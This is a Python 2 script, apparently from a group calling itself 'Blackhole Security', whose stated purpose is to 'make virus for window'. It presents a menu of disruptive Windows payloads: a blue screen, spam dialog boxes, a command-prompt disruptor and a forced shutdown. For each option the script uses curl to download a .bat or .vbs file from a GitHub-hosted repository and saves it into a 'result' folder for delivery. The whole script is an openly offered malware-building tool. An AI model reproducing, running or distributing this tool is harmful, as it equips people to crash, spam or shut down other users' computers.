import sys,random,os,time,subprocess
import wget

if sys.platform == "linux" or sys.platform == "linux2":
 subprocess.call("clear",shell=True)
else:
 print "{!} Cannot running in windows {!}"
 exit()
def ban():
 print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 print "{+} Author  : LM40 + X14N23N6 :>    {+}"
 print "{+} Team    : Blackhole Security    {+}"
 print "{+} Purpose : Make virus for window {+}"
 print "{+} Thanks to God - member BHS      {+}"
 print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 
def do():
 print "{+} Downloading virus from Server {+}" 
 time.sleep(3)
def di():
 print "{+} Downloading Success {+}"
 
def make():
 print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 print "{1} Bluescreen of Death               *"    
 print "{2} Spam Dialog Box                   *"
 print "{3} Spam Dialog Box + Sound           *"
 print "{4} Fuck CMD                          *"
 print "{5} Shutdown                          *"
 print "{0} Exit                              *"
 print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 
def sel():
 try:
  select=raw_input("{?}What You Want-# ")
  if select.lower() == "1":
   do()
   subprocess.call("curl -LO https://raw.githubusercontent.com/x14n23n6/install/master/blue.bat",shell=True)
   di()
   os.system("mv blue.bat result")
  elif select.lower() == "2":
   do()
   subprocess.call("curl -LO https://raw.githubusercontent.com/x14n23n6/install/master/dial.vbs",shell=True)
   di()
   os.system("mv dial.vbs result")
  elif select.lower() == "3":
   do()
   subprocess.call("curl -LO https://raw.githubusercontent.com/x14n23n6/install/master/dial2.vbs",shell=True)
   di()
   os.system("mv dial2.vbs result")
  elif select.lower() == "4":
   do()
   subprocess.call("curl -LO https://raw.githubusercontent.com/x14n23n6/install/master/cmd.bat",shell=True)
   di()
   os.system("mv cmd.bat result")
  elif select.lower() == "5":
   do()
   subprocess.call("curl -LO https://raw.githubusercontent.com/x14n23n6/install/master/shutdown.bat",shell=True)
   di()
   os.system("mv shutdown.bat result")
  elif select.lower() == "0":
   exit()
  else:
   print "{*} Invalid Command"
   return sel()
 except KeyboardInterrupt:
  print "{-} Exit"
  exit()
 except EOFError:
  print "{-} Exit"
  exit()
  
if __name__ == "__main__":
 ban()
 make()
 sel()